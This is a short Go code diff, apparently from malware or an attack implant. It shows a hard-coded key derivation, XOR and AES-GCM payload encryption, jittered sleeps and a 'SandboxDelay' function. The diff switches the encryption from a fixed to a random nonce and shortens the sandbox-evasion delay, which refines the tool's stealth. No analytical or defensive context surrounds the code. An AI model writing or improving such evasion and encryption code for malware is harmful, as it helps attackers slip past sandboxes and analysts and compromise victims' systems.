@@ -25,10 +25,7 @@ func xorCrypt(data []byte) []byte {
 	return result
 }
 
-var (
-	masterKey   = deriveKey("clear_shadow_2024_archnexus707")
-	masterNonce = []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0xFE, 0xDC, 0xBA, 0x98}
-)
+var masterKey = deriveKey("clear_shadow_2024_archnexus707")
 
 func deriveKey(seed string) []byte {
 	h := sha256.Sum256([]byte(seed + "\x00\xFF\xAA\x55\xDE\xAD"))
@@ -38,8 +35,10 @@ func deriveKey(seed string) []byte {
 func aesEncrypt(plain []byte) []byte {
 	block, _ := aes.NewCipher(masterKey)
 	aesgcm, _ := cipher.NewGCM(block)
-	ciphertext := aesgcm.Seal(nil, masterNonce, plain, nil)
-	return append(masterNonce, ciphertext...)
+	nonce := make([]byte, aesgcm.NonceSize())
+	rand.Read(nonce)
+	ciphertext := aesgcm.Seal(nil, nonce, plain, nil)
+	return append(nonce, ciphertext...)
 }
 
 func aesDecrypt(data []byte) []byte {
@@ -97,8 +96,8 @@ func jitterSleep(ms int) {
 // ═══════════════════════════════════════════════════════════════
 
 func SandboxDelay() {
-	delay, _ := rand.Int(rand.Reader, big.NewInt(15))
-	time.Sleep(time.Duration(15+delay.Int64()) * time.Second)
+	delay, _ := rand.Int(rand.Reader, big.NewInt(3))
+	time.Sleep(time.Duration(2+delay.Int64()) * time.Second)
 }
 
 // ═══════════════════════════════════════════════════════════════
